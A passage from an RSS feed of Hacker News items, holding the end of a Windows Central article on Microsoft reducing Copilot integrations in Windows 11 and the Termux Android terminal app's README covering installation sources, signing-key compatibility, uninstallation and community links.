platforms.</p><figure id="3856c7bd-2c85-450d-a7ac-91d84d4c4f25"><blockquote><p>The company is shifting away from ‘AI everywhere’ and toward features that actually make sense for Windows users.</p></blockquote></figure><p id="e904d929-ca65-45b6-9004-d9e3911a67ec">The good news is that it's clear Microsoft has heard the feedback around its heavy-handedness when it comes to Copilot buttons in Windows apps. The company is stepping back to readjust how best to implement these AI integrations across the OS, hopefully resulting in a more meaningful and useful AI experience on the platform, rather than haphazardly adding the Copilot icon to every UI surface it can.</p><p><a data-analytics-id="inline-link" href="https://www.windowscentral.com/microsoft/windows-11/microsoft-promises-2026-will-be-a-better-year-for-windows-11-confirms-plans-to-address-pain-points-across-the-os" data-url="https://www.windowscentral.com/microsoft/windows-11/microsoft-promises-2026-will-be-a-better-year-for-windows-11-confirms-plans-to-address-pain-points-across-the-os" data-hl-processed="none" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.windowscentral.com/microsoft/windows-11/microsoft-promises-2026-will-be-a-better-year-for-windows-11-confirms-plans-to-address-pain-points-across-the-os">This effort is likely part of Microsoft's overall effort to "fix" Windows 11 this year.</a> I understand that the company is moving quickly to begin shipping meaningful changes that are designed to signal to customers that it is listening to feedback, and streamlining where Copilot shows up across in-box apps would be a strong place to start.</p><figure data-bordeaux-image-check="" id="cd0ffd5a-4a3c-4d65-a0ac-168db0be9354"><div><p> <picture data-new-v2-image="true">
<source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T-1200-80.png.webp 1200w, https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T-1024-80.png.webp 1024w, https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T-970-80.png.webp 970w, https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T-650-80.png.webp 650w, https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T-480-80.png.webp 480w, https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T-320-80.png.webp 320w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)">
<img src="https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T.png" alt="A banner that reads &amp;amp;quot;It&amp;#039;s Poll Time&amp;amp;quot; and shows a graphic with a dial on it pointing to a mid-range hue on a gradient." srcset="https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T-1200-80.png 1200w, https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T-1024-80.png 1024w, https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T-970-80.png 970w, https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T-650-80.png 650w, https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T-480-80.png 480w, https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T-320-80.png 320w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-new-v2-image="true" data-original-mos="https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T.png" data-pin-media="https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T.png">
</picture></p></div></figure><p id="5ddf36d0-e9a1-47d5-acff-bb1fc9387189"><strong>Microsoft pulling back its Windows 11 AI push is a big shift — fewer forced Copilot moments, a reworked Recall, and a more realistic approach overall. </strong><br><em></em><br><em>How does that land with you? Is this the right move, or should Microsoft double down instead? Share your take below and let’s see where the community stands.</em></p><hr id="ec5853d8-ad78-4aa8-96d9-5ad0a01092a8"><figure data-bordeaux-image-check="" id="70771e15-45de-402a-87f8-27b20ad37af7"><div><p> <picture data-new-v2-image="true">
<source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX-661-80.png.webp 1200w, https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX-661-80.png.webp 1024w, https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX-661-80.png.webp 970w, https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX-650-80.png.webp 650w, https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX-480-80.png.webp 480w, https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX-320-80.png.webp 320w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)">
<img src="https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX.png" alt="Click to follow Windows Central on Google News" srcset="https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX-661-80.png 1200w, https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX-661-80.png 1024w, https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX-661-80.png 970w, https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX-650-80.png 650w, https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX-480-80.png 480w, https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX-320-80.png 320w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-new-v2-image="true" data-original-mos="https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX.png" data-pin-media="https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX.png">
</picture></p></div></figure><p id="b2afe6da-ca17-48d1-9cec-f54cae8dc9df"><em>Follow </em><a data-analytics-id="inline-link" href="https://news.google.com/publications/CAAqLggKIihDQklTR0FnTWFoUUtFbmRwYm1SdmQzTmpaVzUwY21Gc0xtTnZiU2dBUAE" target="_blank" data-url="https://news.google.com/publications/CAAqLggKIihDQklTR0FnTWFoUUtFbmRwYm1SdmQzTmpaVzUwY21Gc0xtTnZiU2dBUAE" referrerpolicy="no-referrer-when-downgrade" data-hl-processed="none" data-mrf-recirculation="inline-link"><em>Windows Central on Google News</em></a><em> to keep our latest news, insights, and features at the top of your feeds!</em></p><hr id="4d523f84-c987-4d19-ad71-2687391d1d31">
</div>


<div data-hydrate="true" id="slice-container-authorBio-LUupfiQTB9W4FUFHtr2sWY"><p>Zac Bowden is a Senior Editor at Windows Central and has been with the site since 2016. Bringing you exclusive coverage into the world of Windows, Surface, and hardware. He's also an avid collector of rare Microsoft prototype devices! Keep in touch on <a href="https://twitter.com/zacbowden">Twitter</a> and <a href="https://threads.net/@zacbowden">Threads</a></p></div>
</section>

<div x-show="$store.Viafoura.showWidgets" x-cloak="" data-component-name="Viafoura:Comments" x-data="ViafouraComments('300px')" data-nosnippet="" data-community-guidelines-text="<p class='vfcustom-community-guidelines'>Please follow our <a href=&quot;https://www.windowscentral.com/about#section-community-guidelines&quot; target=&quot;_blank&quot;>community guidelines</a>.</p>">
<p>You must confirm your public display name before commenting</p>
<p>Please logout and then login again, you will then be prompted to enter your display name.</p>
</div>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Termux (239 pts)]]></title>
            <link>https://github.com/termux/termux-app</link>
            <guid>46854642</guid>
            <pubDate>Mon, 02 Feb 2026 11:03:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/termux/termux-app">https://github.com/termux/termux-app</a>, See on <a href="https://news.ycombinator.com/item?id=46854642">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Termux application</h2><a id="user-content-termux-application" aria-label="Permalink: Termux application" href="#termux-application"></a></p>
<p dir="auto"><a href="https://github.com/termux/termux-app/actions"><img src="https://github.com/termux/termux-app/workflows/Build/badge.svg" alt="Build status"></a>
<a href="https://github.com/termux/termux-app/actions"><img src="https://github.com/termux/termux-app/workflows/Unit%20tests/badge.svg" alt="Testing status"></a>
<a href="https://gitter.im/termux/termux" rel="nofollow"><img src="https://camo.githubusercontent.com/9c14d4fbfda6abb126a406d570f172f45e72876e28ef385f719e8e823dd58014/68747470733a2f2f6261646765732e6769747465722e696d2f7465726d75782f7465726d75782e737667" alt="Join the chat at https://gitter.im/termux/termux" data-canonical-src="https://badges.gitter.im/termux/termux.svg"></a>
<a href="https://discord.gg/HXpF69X" rel="nofollow"><img src="https://camo.githubusercontent.com/7c09fdc7ef9a56afa3dcb3b9bd0f3bd0176943ca6e0538aa936643768fea89dd/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f3634313235363931343638343038343233342e7376673f6c6162656c3d266c6f676f3d646973636f7264266c6f676f436f6c6f723d66666666666626636f6c6f723d353836354632" alt="Join the Termux discord server" data-canonical-src="https://img.shields.io/discord/641256914684084234.svg?label=&amp;logo=discord&amp;logoColor=ffffff&amp;color=5865F2"></a>
<a href="https://jitpack.io/#termux/termux-app" rel="nofollow"><img src="https://camo.githubusercontent.com/eab085c0233c31fb310d41dbf78ea9af8932cf2875e0a02f9054e91a4ff11804/68747470733a2f2f6a69747061636b2e696f2f762f7465726d75782f7465726d75782d6170702e737667" alt="Termux library releases at Jitpack" data-canonical-src="https://jitpack.io/v/termux/termux-app.svg"></a></p>
<p dir="auto"><a href="https://termux.com/" rel="nofollow">Termux</a> is an Android terminal application and Linux environment.</p>
<p dir="auto">Note that this repository is for the app itself (the user interface and the terminal emulation). For the packages installable inside the app, see <a href="https://github.com/termux/termux-packages">termux/termux-packages</a>.</p>
<p dir="auto">Quick how-to about Termux package management is available at <a href="https://github.com/termux/termux-packages/wiki/Package-Management">Package Management</a>. It also has info on how to fix <strong><code>repository is under maintenance or down</code></strong> errors when running <code>apt</code> or <code>pkg</code> commands.</p>
<p dir="auto"><strong>We are looking for Termux Android application maintainers.</strong></p>
<hr>
<p dir="auto"><strong>NOTICE: Termux may be unstable on Android 12+.</strong> Android OS will kill any (phantom) processes greater than 32 (limit is for all apps combined) and also kill any processes using excessive CPU. You may get <code>[Process completed (signal 9) - press Enter]</code> message in the terminal without actually exiting the shell process yourself. Check the related issue <a href="https://github.com/termux/termux-app/issues/2366" data-hovercard-type="issue" data-hovercard-url="/termux/termux-app/issues/2366/hovercard">#2366</a>, <a href="https://issuetracker.google.com/u/1/issues/205156966" rel="nofollow">issue tracker</a>, <a href="https://github.com/agnostic-apollo/Android-Docs/blob/master/en/docs/apps/processes/phantom-cached-and-empty-processes.md">phantom cached and empty processes docs</a> and <a href="https://github.com/termux/termux-app/issues/2366#issuecomment-1237468220" data-hovercard-type="issue" data-hovercard-url="/termux/termux-app/issues/2366/hovercard">this TLDR comment</a> on how to disable trimming of phantom and excessive cpu usage processes. A proper docs page will be added later. An option to disable the killing should be available in Android 12L or 13, so upgrade at your own risk if you are on Android 11, specially if you are not rooted.</p>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contents</h2><a id="user-content-contents" aria-label="Permalink: Contents" href="#contents"></a></p>
<ul dir="auto">
<li><a href="#termux-app-and-plugins">Termux App and Plugins</a></li>
<li><a href="#installation">Installation</a></li>
<li><a href="#uninstallation">Uninstallation</a></li>
<li><a href="#important-links">Important Links</a></li>
<li><a href="#debugging">Debugging</a></li>
<li><a href="#for-maintainers-and-contributors">For Maintainers and Contributors</a></li>
<li><a href="#forking">Forking</a></li>
<li><a href="#sponsors-and-funders">Sponsors and Funders</a></li>
</ul>

<p dir="auto"><h2 tabindex="-1" dir="auto">Termux App and Plugins</h2><a id="user-content-termux-app-and-plugins" aria-label="Permalink: Termux App and Plugins" href="#termux-app-and-plugins"></a></p>
<p dir="auto">The core <a href="https://github.com/termux/termux-app">Termux</a> app comes with the following optional plugin apps.</p>
<ul dir="auto">
<li><a href="https://github.com/termux/termux-api">Termux:API</a></li>
<li><a href="https://github.com/termux/termux-boot">Termux:Boot</a></li>
<li><a href="https://github.com/termux/termux-float">Termux:Float</a></li>
<li><a href="https://github.com/termux/termux-styling">Termux:Styling</a></li>
<li><a href="https://github.com/termux/termux-tasker">Termux:Tasker</a></li>
<li><a href="https://github.com/termux/termux-widget">Termux:Widget</a></li>
</ul>

<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto">Latest version is <code>v0.118.3</code>.</p>
<p dir="auto"><strong>NOTICE: It is highly recommended that you update to <code>v0.118.0</code> or higher ASAP for various bug fixes, including a critical world-readable vulnerability reported <a href="https://termux.github.io/general/2022/02/15/termux-apps-vulnerability-disclosures.html" rel="nofollow">here</a>. See <a href="#google-play-store-experimental-branch">below</a> for information regarding Termux on Google Play.</strong></p>
<p dir="auto">Termux can be obtained through various sources listed below for <strong>only</strong> Android <code>&gt;= 7</code> with full support for apps and packages.</p>
<p dir="auto">Support for both app and packages was dropped for Android <code>5</code> and <code>6</code> on <a href="https://www.reddit.com/r/termux/comments/dnzdbs/end_of_android56_support_on_20200101/" rel="nofollow">2020-01-01</a> at <code>v0.83</code>, however it was re-added just for the app <em>without any support for package updates</em> on <a href="https://github.com/termux/termux-app/pull/2740" data-hovercard-type="pull_request" data-hovercard-url="/termux/termux-app/pull/2740/hovercard">2022-05-24</a> via the <a href="#github">GitHub</a> sources. Check <a href="https://github.com/termux/termux-app/wiki/Termux-on-android-5-or-6">here</a> for the details.</p>
<p dir="auto">The APK files of different sources are signed with different signature keys. The <code>Termux</code> app and all its plugins use the same <a href="https://developer.android.com/guide/topics/manifest/manifest-element" rel="nofollow"><code>sharedUserId</code></a> <code>com.termux</code> and so all their APKs installed on a device must have been signed with the same signature key to work together and so they must all be installed from the same source. Do not attempt to mix them together, i.e do not try to install an app or plugin from <code>F-Droid</code> and another one from a different source like <code>GitHub</code>. Android Package Manager will also normally not allow installation of APKs with different signatures and you will get errors on installation like <code>App not installed</code>, <code>Failed to install due to an unknown error</code>, <code>INSTALL_FAILED_UPDATE_INCOMPATIBLE</code>, <code>INSTALL_FAILED_SHARED_USER_INCOMPATIBLE</code>, <code>signatures do not match previously installed version</code>, etc. This restriction can be bypassed with root or with custom roms.</p>
<p dir="auto">If you wish to install from a different source, then you must <strong>uninstall any and all existing Termux or its plugin app APKs</strong> from your device first, then install all new APKs from the same new source. Check <a href="#uninstallation">Uninstallation</a> section for details. You may also want to consider <a href="https://wiki.termux.com/wiki/Backing_up_Termux" rel="nofollow">Backing up Termux</a> before the uninstallation so that you can restore it after re-installing from Termux different source.</p>
<p dir="auto">In the following paragraphs, <em>"bootstrap"</em> refers to the minimal packages that are shipped with the <code>termux-app</code> itself to start a working shell environment. Its zips are built and released <a href="https://github.com/termux/termux-packages/releases">here</a>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">F-Droid</h3><a id="user-content-f-droid" aria-label="Permalink: F-Droid" href="#f-droid"></a></p>
<p dir="auto">Termux application can be obtained from <code>F-Droid</code> from <a href="https://f-droid.org/en/packages/com.termux/" rel="nofollow">here</a>.</p>
<p dir="auto">You <strong>do not</strong> need to download the <code>F-Droid</code> app (via the <code>Download F-Droid</code> link) to install Termux. You can download the Termux APK directly from the site by clicking the <code>Download APK</code> link at the bottom of each version section.</p>
<p dir="auto">It usually takes a few days (or even a week or more) for updates to be available on <code>F-Droid</code> once an update has been released on <code>GitHub</code>. The <code>F-Droid</code> releases are built and published by <code>F-Droid</code> once they <a href="https://gitlab.com/fdroid/fdroiddata/-/blob/master/metadata/com.termux.yml" rel="nofollow">detect</a> a new <code>GitHub</code> release. The Termux maintainers <strong>do not</strong> have any control over the building and publishing of the Termux apps on <code>F-Droid</code>. Moreover, the Termux maintainers also do not have access to the APK signing keys of <code>F-Droid</code> releases, so we cannot release an APK ourselves on <code>GitHub</code> that would be compatible with <code>F-Droid</code> releases.</p>
<p dir="auto">The <code>F-Droid</code> app often may not notify you of updates and you will manually have to do a pull down swipe action in the <code>Updates</code> tab of the app for it to check updates. Make sure battery optimizations are disabled for the app, check <a href="https://dontkillmyapp.com/" rel="nofollow">https://dontkillmyapp.com/</a> for details on how to do that.</p>
<p dir="auto">Only a universal APK is released, which will work on all supported architectures. The APK and bootstrap installation size will be <code>~180MB</code>. <code>F-Droid</code> does <a href="https://github.com/termux/termux-app/pull/1904" data-hovercard-type="pull_request" data-hovercard-url="/termux/termux-app/pull/1904/hovercard">not support</a> architecture specific APKs.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">GitHub</h3><a id="user-content-github" aria-label="Permalink: GitHub" href="#github"></a></p>
<p dir="auto">Termux application can be obtained on <code>GitHub</code> either from <a href="https://github.com/termux/termux-app/releases"><code>GitHub Releases</code></a> for version <code>&gt;= 0.118.0</code> or from <a href="https://github.com/termux/termux-app/actions/workflows/debug_build.yml?query=branch%3Amaster+event%3Apush"><code>GitHub Build Action</code></a> workflows. <strong>For android <code>&gt;= 7</code>, only install <code>apt-android-7</code> variants. For android <code>5</code> and <code>6</code>, only install <code>apt-android-5</code> variants.</strong></p>
<p dir="auto">The APKs for <code>GitHub Releases</code> will be listed under <code>Assets</code> drop-down of a release. These are automatically attached when a new version is released.</p>
<p dir="auto">The APKs for <code>GitHub Build</code> action workflows will be listed under <code>Artifacts</code> section of a workflow run. These are created for each commit/push done to the repository and can be used by users who don't want to wait for releases and want to try out the latest features immediately or want to test their pull requests. Note that for action workflows, you need to be <a href="https://github.com/login"><strong>logged into a <code>GitHub</code> account</strong></a> for the <code>Artifacts</code> links to be enabled/clickable. If you are using the <a href="https://github.com/mobile"><code>GitHub</code> app</a>, then make sure to open workflow link in a browser like Chrome or Firefox that has your GitHub account logged in since the in-app browser may not be logged in.</p>
<p dir="auto">The APKs for both of these are <a href="https://developer.android.com/studio/debug" rel="nofollow"><code>debuggable</code></a> and are compatible with each other but they are not compatible with other sources.</p>
<p dir="auto">Both universal and architecture specific APKs are released. The APK and bootstrap installation size will be <code>~180MB</code> if using universal and <code>~120MB</code> if using architecture specific. Check <a href="https://github.com/termux/termux-app/issues/2153" data-hovercard-type="issue" data-hovercard-url="/termux/termux-app/issues/2153/hovercard">here</a> for details.</p>
<p dir="auto"><strong>Security warning</strong>: APK files on GitHub are signed with a test key that has been <a href="https://github.com/termux/termux-app/blob/master/app/testkey_untrusted.jks">shared with community</a>. This IS NOT an official developer key and everyone can use it to generate releases for own testing. Be very careful when using Termux GitHub builds obtained elsewhere except <a href="https://github.com/termux/termux-app">https://github.com/termux/termux-app</a>. Everyone is able to use it to forge a malicious Termux update installable over the GitHub build. Think twice about installing Termux builds distributed via Telegram or other social media. If your device get caught by malware, we will not be able to help you.</p>
<p dir="auto">The <a href="https://github.com/termux/termux-app/blob/master/app/testkey_untrusted.jks">test key</a> shall not be used to impersonate @termux and can't be used for this anyway. This key is not trusted by us and it is quite easy to detect its use in user generated content.</p>
<details>
<summary>Keystore information</summary>
<div data-snippet-clipboard-copy-content="Alias name: alias
Creation date: Oct 4, 2019
Entry type: PrivateKeyEntry
Certificate chain length: 1
Certificate[1]:
Owner: CN=APK Signer, OU=Earth, O=Earth
Issuer: CN=APK Signer, OU=Earth, O=Earth
Serial number: 29be297b
Valid from: Wed Sep 04 02:03:24 EEST 2019 until: Tue Oct 26 02:03:24 EEST 2049
Certificate fingerprints:
         SHA1: 51:79:55:EA:BF:69:FC:05:7C:41:C7:D3:79:DB:BC:EF:20:AD:85:F2
         SHA256: B6:DA:01:48:0E:EF:D5:FB:F2:CD:37:71:B8:D1:02:1E:C7:91:30:4B:DD:6C:4B:F4:1D:3F:AA:BA:D4:8E:E5:E1
Signature algorithm name: SHA1withRSA (disabled)
Subject Public Key Algorithm: 2048-bit RSA key
Version: 3"><pre><code>Alias name: alias
Creation date: Oct 4, 2019
Entry type: PrivateKeyEntry
Certificate chain length: 1
Certificate[1]:
Owner: CN=APK Signer, OU=Earth, O=Earth
Issuer: CN=APK Signer, OU=Earth, O=Earth
Serial number: 29be297b
Valid from: Wed Sep 04 02:03:24 EEST 2019 until: Tue Oct 26 02:03:24 EEST 2049
Certificate fingerprints:
         SHA1: 51:79:55:EA:BF:69:FC:05:7C:41:C7:D3:79:DB:BC:EF:20:AD:85:F2
         SHA256: B6:DA:01:48:0E:EF:D5:FB:F2:CD:37:71:B8:D1:02:1E:C7:91:30:4B:DD:6C:4B:F4:1D:3F:AA:BA:D4:8E:E5:E1
Signature algorithm name: SHA1withRSA (disabled)
Subject Public Key Algorithm: 2048-bit RSA key
Version: 3
</code></pre></div>
</details>
<p dir="auto"><h3 tabindex="-1" dir="auto">Google Play Store <strong>(Experimental branch)</strong></h3><a id="user-content-google-play-store-experimental-branch" aria-label="Permalink: Google Play Store (Experimental branch)" href="#google-play-store-experimental-branch"></a></p>
<p dir="auto">There is currently a build of Termux available on Google Play for Android 11+ devices, with extensive adjustments in order to pass policy requirements there. This is under development and has missing functionality and bugs (see <a href="https://github.com/termux-play-store/">here</a> for status updates) compared to the stable F-Droid build, which is why most users who can should still use F-Droid or GitHub build as mentioned above.</p>
<p dir="auto">Currently, Google Play will try to update installations away from F-Droid ones. Updating will still fail as <a href="https://developer.android.com/guide/topics/manifest/manifest-element#uid" rel="nofollow">sharedUserId</a> has been removed. A planned 0.118.1 F-Droid release will fix this by setting a higher version code than used for the PlayStore app. Meanwhile, to prevent Google Play from attempting to download and then fail to install the Google Play releases over existing installations, you can open the Termux apps pages on Google Play and then click on the 3 dots options button in the top right and then disable the Enable auto update toggle. However, the Termux apps updates will still show in the PlayStore app updates list.</p>
<p dir="auto">If you want to help out with testing the Google Play build (or cannot install Termux from other sources), be aware that it's built from a separate repository (<a href="https://github.com/termux-play-store/">https://github.com/termux-play-store/</a>) - be sure to report issues <a href="https://github.com/termux-play-store/termux-issues/issues/new/choose">there</a>, as any issues encountered might very well be specific to that repository.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Uninstallation</h2><a id="user-content-uninstallation" aria-label="Permalink: Uninstallation" href="#uninstallation"></a></p>
<p dir="auto">Uninstallation may be required if a user doesn't want Termux installed in their device anymore or is switching to a different <a href="#installation">install source</a>. You may also want to consider <a href="https://wiki.termux.com/wiki/Backing_up_Termux" rel="nofollow">Backing up Termux</a> before the uninstallation.</p>
<p dir="auto">To uninstall Termux completely, you must uninstall <strong>any and all existing Termux or its plugin app APKs</strong> listed in <a href="#termux-app-and-plugins">Termux App and Plugins</a>.</p>
<p dir="auto">Go to <code>Android Settings</code> -&gt; <code>Applications</code> and then look for those apps. You can also use the search feature if it’s available on your device and search <code>termux</code> in the applications list.</p>
<p dir="auto">Even if you think you have not installed any of the plugins, it's strongly suggested to go through the application list in Android settings and double-check.</p>

<p dir="auto"><h2 tabindex="-1" dir="auto">Important Links</h2><a id="user-content-important-links" aria-label="Permalink: Important Links" href="#important-links"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Community</h3><a id="user-content-community" aria-label="Permalink: Community" href="#community"></a></p>
<p dir="auto">All community links are available <a href="https://wiki.termux.com/wiki/Community" rel="nofollow">here</a>.</p>
<p dir="auto">The main ones are the following.</p>
<ul dir="auto">
<li><a href="https://reddit.com/r/termux" rel="nofollow">Termux Reddit community</a></li>
<li><a href="https://matrix.to/#/#termux_termux:gitter.im" rel="nofollow">Termux User Matrix Channel</a> (<a href="https://gitter.im/termux/termux" rel="nofollow">Gitter</a>)</li>
<li><a href="https://matrix.to/#/#termux_dev:gitter.im" rel="nofollow">Termux Dev Matrix Channel</a> (<a href="https://gitter.im/termux/dev" rel="nofollow">Gitter</a>)</li>
<li><a href="https://twitter.com/termuxdevs" rel="nofollow">Termux X (Twitter)</a></li>
<li><a href="mailto:support@termux.dev">Termux Support Email</a></li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Wikis</h3><a id="user-content-wikis" aria-label="Permalink: Wikis" href="#wikis"></a></p>
<ul dir="auto">
<li><a href="https://wiki.termux.com/wiki/" rel="nofollow">Termux Wiki</a></li>
<li><a href="https://github.com/termux/termux-app/wiki">Termux App Wiki</a></li>
<li><a href="https://github.com/termux/termux-packages/wiki">Termux Packages Wiki</a></li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Miscellaneous</h3><a id="user-content-miscellaneous" aria-label="Permalink: Miscellaneous" href="#miscellaneous"></a></p>
<ul dir="auto">
<li><a href="https://wiki.termux.com/wiki/FAQ" rel="nofollow">FAQ</a></li>
<li><a href="https://github.com/termux/termux-packages/wiki/Termux-file-system-layout">Termux File System Layout</a></li>
<li><a href="https://wiki.termux.com/wiki/Differences_from_Linux" rel="nofollow">Differences From Linux</a></li>
<li><a href="https://wiki.termux.com/wiki/Package_Management" rel="nofollow">Package Management</a></li>
<li><a href="https://wiki.termux.com/wiki/Remote_Access" rel="nofollow">Remote Access</a></li>
<li><a href="https://wiki.termux.com/wiki/Backing_up_Termux" rel="nofollow">Backing up Termux</a></li>
<li><a href="https://wiki.termux.com/wiki/Terminal_Settings" rel="nofollow">Terminal Settings</a></li>
<li><a href="https://wiki.termux.com/wiki/Touch_Keyboard" rel="nofollow">Touch Keyboard</a></li>
<li><a href="https://wiki.termux.com/wiki/Internal_and_external_storage" rel="nofollow">Android Storage and Sharing Data with Other Apps</a></li>
<li><a href="https://wiki.termux.com/wiki/Termux:API" rel="nofollow">Android APIs</a></li>
<li><a href="https://github.com/termux/termux-packages/issues/6348" data-hovercard-type="issue" data-hovercard-url="/termux/termux-packages/issues/6348/hovercard">Moved Termux Packages Hosting From Bintray to IPFS</a></li>
<li><a href="https://github.com/termux/termux-app/wiki/RUN_COMMAND-Intent">Running Commands in Termux From Other Apps via <code>RUN_COMMAND</code> intent</a></li>
<li><a href="https://github.com/termux/termux-packages/wiki/Termux-and-Android-10">Termux and Android 10</a></li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Terminal</h3><a id="user-content-terminal" aria-label="Permalink: Terminal" href="#terminal"></a></p>
<details>
<summary></summary>
<p dir="auto"><h3 tabindex="-1" dir="auto">Terminal resources</h3><a id="user-content-terminal-resources" aria-label="Permalink: Terminal resources" href="#terminal-resources"></a></p>
<ul dir="auto">
<li><a href="https://invisible-island.net/xterm/ctlseqs/ctlseqs.html" rel="nofollow">XTerm control sequences</a></li>
<li><a href="https://vt100.net/" rel="nofollow">vt100.net</a></li>
<li><a href="https://wiki.bash-hackers.org/scripting/terminalcodes" rel="nofollow">Terminal codes (ANSI and terminfo equivalents)</a></li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Terminal emulators</h3><a id="user-content-terminal-emulators" aria-label="Permalink: Terminal emulators" href="#terminal-emulators"></a></p>
<ul dir="auto">
<li>
<p dir="auto">VTE (libvte): Terminal emulator widget for GTK+, mainly used in gnome-terminal. <a href="https://github.com/GNOME/vte">Source</a>, <a href="https://bugzilla.gnome.org/buglist.cgi?quicksearch=product%3A%22vte%22+" rel="nofollow">Open Issues</a>, and <a href="https://bugzilla.gnome.org/buglist.cgi?bug_status=RESOLVED&amp;bug_status=VERIFIED&amp;chfield=resolution&amp;chfieldfrom=-2000d&amp;chfieldvalue=FIXED&amp;product=vte&amp;resolution=FIXED" rel="nofollow">All (including closed) issues</a>.</p>
</li>
<li>
<p dir="auto">iTerm 2: OS X terminal application. <a href="https://github.com/gnachman/iTerm2">Source</a>, <a href="https://gitlab.com/gnachman/iterm2/issues" rel="nofollow">Issues</a> and <a href="https://iterm2.com/documentation.html" rel="nofollow">Documentation</a> (which includes <a href="https://iterm2.com/documentation-escape-codes.html" rel="nofollow">iTerm2 proprietary escape codes</a>).</p>
</li>
<li>
<p dir="auto">Konsole: KDE terminal application. <a href="https://projects.kde.org/projects/kde/applications/konsole/repository" rel="nofollow">Source</a>, in particular <a href="https://projects.kde.org/projects/kde/applications/konsole/repository/revisions/master/show/tests" rel="nofollow">tests</a>, <a href="https://bugs.kde.org/buglist.cgi?bug_severity=critical&amp;bug_severity=grave&amp;bug_severity=major&amp;bug_severity=crash&amp;bug_severity=normal&amp;bug_severity=minor&amp;bug_status=UNCONFIRMED&amp;bug_status=NEW&amp;bug_status=ASSIGNED&amp;bug_status=REOPENED&amp;product=konsole" rel="nofollow">Bugs</a> and <a href="https://bugs.kde.org/buglist.cgi?bug_severity=wishlist&amp;bug_status=UNCONFIRMED&amp;bug_status=NEW&amp;bug_status=ASSIGNED&amp;bug_status=REOPENED&amp;product=konsole" rel="nofollow">Wishes</a>.</p>
</li>
<li>
<p dir="auto">hterm: JavaScript terminal implementation from Chromium. <a href="https://github.com/chromium/hterm">Source</a>, including <a href="https://github.com/chromium/hterm/blob/master/js/hterm_vt_tests.js">tests</a>, and <a href="https://groups.google.com/a/chromium.org/forum/#!forum/chromium-hterm" rel="nofollow">Google group</a>.</p>
</li>
<li>
<p dir="auto">xterm: The grandfather of terminal emulators. <a href="https://invisible-island.net/datafiles/release/xterm.tar.gz" rel="nofollow">Source</a>.</p>
</li>
<li>
<p dir="auto">Connectbot: Android SSH client. <a href="https://github.com/connectbot/connectbot">Source</a></p>
</li>
<li>
<p dir="auto">Android Terminal Emulator: Android terminal app which Termux terminal handling is based on. Inactive. <a href="https://github.com/jackpal/Android-Terminal-Emulator">Source</a>.</p>
</li>
</ul>
</details>

<p dir="auto"><h3 tabindex="-1" dir="auto">Debugging</h3><a id="user-content-debugging" aria-label="Permalink: Debugging" href="#debugging"></a></p>
